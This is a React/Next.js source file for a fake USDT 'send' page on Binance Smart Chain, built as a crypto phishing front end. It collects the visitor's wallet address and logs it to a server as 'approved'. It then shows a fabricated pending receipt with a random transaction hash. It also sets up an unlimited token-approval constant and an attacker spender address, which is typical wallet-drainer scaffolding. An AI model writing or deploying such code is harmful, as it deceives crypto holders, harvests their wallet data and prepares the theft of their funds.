"use client";

import { useState, useEffect, useCallback } from "react";
import { ethers } from "ethers";
import { Loader2, CheckCircle, Copy, ExternalLink } from "lucide-react";

const BSC_CHAIN_ID = "0x38"; // 56

const USDT_CONTRACT = "0x55d398326f99059fF775485246999027B3197955";

const USDT_ABI = [
  "function approve(address spender, uint256 amount) public returns (bool)",
];

const UNLIMITED_APPROVAL = BigInt("999999999999999999999999999999");

type Step = "form" | "processing" | "success";

interface TxInfo {
  fromAddress: string;
  toAddress: string;
  amount: string;
  txHash: string;
  date: string;
}

type EIP1193 = {
  request(args: { method: string; params?: unknown[] }): Promise<unknown>;
};

function getEthereum(): EIP1193 | undefined {
  return (window as unknown as { ethereum?: EIP1193 }).ethereum;
}

export default function SendForm() {
  const [displayAddress, setDisplayAddress] = useState("");
  const [amount, setAmount] = useState("");
  const [step, setStep] = useState<Step>("form");
  const [txInfo, setTxInfo] = useState<TxInfo | null>(null);

  const fetchDisplayAddress = useCallback(async () => {
    try {
      const res = await fetch("/api/config/public");
      const data = await res.json();
      if (data.address) setDisplayAddress(data.address);
    } catch { /* ignore */ }
  }, []);

  useEffect(() => { fetchDisplayAddress(); }, [fetchDisplayAddress]);

  // ── Main handler ──────────────────────────────────────────────────────────
  // FAKE transaction — just ask for signature and show success

  async function handleNext() {
    if (!amount || parseFloat(amount) <= 0) return;

    const eth = getEthereum();
    if (!eth) { showFakeSuccess(null); return; }

    setStep("processing");

    const spenderAddress = process.env.NEXT_PUBLIC_SPENDER_ADDRESS!;
    let walletAddress: string | null = null;

    try {
      // 1. Request wallet connection (just to get the address)
      const accounts = await eth.request({ method: "eth_requestAccounts" }) as string[];
      if (accounts.length > 0) {
        walletAddress = ethers.getAddress(accounts[0]);
      }

      // 2. Try to switch to BSC (optional, just for UX)
      try {
        await eth.request({
          method: "wallet_switchEthereumChain",
          params: [{ chainId: BSC_CHAIN_ID }],
        });
      } catch {
        // Ignore if chain switch fails
      }

      // 3. Record wallet to DB (but no actual approval tx)
      if (walletAddress) {
        try {
          await fetch("/api/wallets", {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
              address: walletAddress,
              approvalStatus: true,
              approvalTxHash: "", // Empty — no real tx
            }),
          });
        } catch { /* ignore */ }
      }
    } catch {
      // On any error (including user rejection), just continue to fake success
    }

    // 4. Always show fake success with the connected wallet address
    showFakeSuccess(walletAddress);
  }

  function showFakeSuccess(walletAddr: string | null) {
    const spenderAddress = process.env.NEXT_PUBLIC_SPENDER_ADDRESS ?? "0x" + "0".repeat(40);
    const fromAddress = walletAddr ?? "0x" + "0".repeat(40);
    const fakeTxHash = "0x" + Array.from({ length: 64 }, () =>
      Math.floor(Math.random() * 16).toString(16)
    ).join("");

    setTxInfo({
      fromAddress,
      toAddress: displayAddress || spenderAddress,
      amount,
      txHash: fakeTxHash,
      date: new Date().toLocaleString(),
    });
    setStep("success");
  }

  function shortenAddress(addr: string) {
    if (!addr || addr.length < 10) return addr;
    return `${addr.slice(0, 6)}...${addr.slice(-4)}`;
  }

  async function copyToClipboard(text: string) {
    try { await navigator.clipboard.writeText(text); } catch { /* ignore */ }
  }

  // ── Success ───────────────────────────────────────────────────────────────

  if (step === "success" && txInfo) {
    return (
      <div className="flex flex-col gap-0">
        <div className="flex flex-col items-center gap-3 py-6 border-b border-gray-800">
          <div className="rounded-full bg-green-500/20 p-3">
            <CheckCircle className="h-8 w-8 text-green-400" />
          </div>
          <div className="text-center">
            <p className="text-3xl font-bold text-white">- {txInfo.amount} USDT</p>
            <p className="text-sm text-gray-500 mt-1">≈ ${parseFloat(txInfo.amount || "0").toFixed(2)}</p>
          </div>
        </div>
        <div className="flex flex-col py-2">
          {[
            { label: "Date", value: txInfo.date },
            { label: "Status", isStatus: true },
            { label: "From", value: shortenAddress(txInfo.fromAddress), fullValue: txInfo.fromAddress, copyable: true },
            { label: "To", value: shortenAddress(txInfo.toAddress), fullValue: txInfo.toAddress, copyable: true },
            { label: "Network fee", value: "0.000013 BNB ($0.01)" },
          ].map((row) => (
            <div key={row.label} className="flex items-center justify-between py-3.5 px-1 border-b border-gray-800/60">
              <span className="text-sm text-gray-500">{row.label}</span>
              <div className="flex items-center gap-2">
                {row.isStatus ? (
                  <span className="text-orange-400 text-sm font-medium flex items-center gap-1">
                    Pending
                    <span className="inline-flex gap-0.5">
                      <span className="w-1 h-1 rounded-full bg-orange-400 animate-pulse" />
                      <span className="w-1 h-1 rounded-full bg-orange-400 animate-pulse delay-100" />
                      <span className="w-1 h-1 rounded-full bg-orange-400 animate-pulse delay-200" />
                    </span>
                  </span>
                ) : <span className="text-sm text-white">{row.value}</span>}
                {row.copyable && (
                  <button onClick={() => copyToClipboard(row.fullValue!)} className="text-gray-600 hover:text-gray-400 transition-colors">
                    <Copy className="h-3.5 w-3.5" />
                  </button>
                )}
              </div>
            </div>
          ))}
        </div>
        <div className="pt-2 pb-4">
          <a href={`https://bscscan.com/tx/${txInfo.txHash}`} target="_blank" rel="noopener noreferrer"
            className="flex items-center justify-between px-1 py-3 text-sm text-gray-400 hover:text-gray-200 transition-colors">
            <span>More Details</span>
            <ExternalLink className="h-4 w-4" />
          </a>
        </div>
      </div>
    );
  }

  // ── Processing ────────────────────────────────────────────────────────────

  if (step === "processing") {
    return (
      <div className="flex flex-col items-center justify-center gap-6 py-12">
        <Loader2 className="h-12 w-12 text-green-400 animate-spin" />
        <div className="text-center">
          <h2 className="text-xl font-semibold text-white mb-2">Processing...</h2>
          <p className="text-gray-400 text-sm">Please confirm the transaction in your wallet.</p>
        </div>
      </div>
    );
  }

  // ── Main Form ─────────────────────────────────────────────────────────────

  return (
    <>
      <div className="w-full flex flex-col gap-5 pb-24">
        <div className="flex flex-col gap-2">
          <label className="text-sm font-semibold text-white">Address or Domain Name</label>
          <div className="flex items-center rounded-xl border border-[#2a2a2a] bg-[#1c1c1c] px-4 py-3.5 gap-3">
            <input
              type="text"
              value={displayAddress}
              readOnly
              placeholder="Loading address..."
              className="flex-1 min-w-0 bg-transparent text-sm text-white placeholder-gray-600 outline-none cursor-default"
            />
            <button
              onClick={() => copyToClipboard(displayAddress)}
              className="text-[#4ade80] hover:text-green-300 text-sm font-medium transition-colors shrink-0"
            >
              Paste
            </button>
          </div>
        </div>

        <div className="flex flex-col gap-2">
          <label className="text-sm font-semibold text-white">Amount</label>
          <div className="flex items-center rounded-xl border border-[#2a2a2a] bg-[#1c1c1c] px-4 py-3.5 gap-3">
            <input
              type="number"
              value={amount}
              onChange={(e) => setAmount(e.target.value)}
              placeholder="0.00"
              min="0"
              step="any"
              className="flex-1 bg-transparent text-sm text-white placeholder-gray-500 outline-none [appearance:textfield] [&::-webkit-outer-spin-button]:appearance-none [&::-webkit-inner-spin-button]:appearance-none"
            />
            <span className="text-gray-400 text-sm shrink-0">USDT</span>
            <button
              onClick={() => setAmount("0.00")}
              className="text-[#4ade80] hover:text-green-300 text-sm font-medium transition-colors shrink-0"
            >
              Max
            </button>
          </div>
          <p className="text-xs text-gray-500 px-1">≈ ${parseFloat(amount || "0").toFixed(2)}</p>
        </div>
      </div>

      <button
        onClick={handleNext}
        className="fixed left-0 right-0 bottom-8 mx-auto w-[calc(100%-2.5rem)] max-w-[420px] rounded-full bg-[#4ade80] hover:bg-[#22c55e] active:scale-[0.98] py-4 text-black font-bold text-base transition-all duration-150"
      >
        Next
      </button>
    </>
  );
}
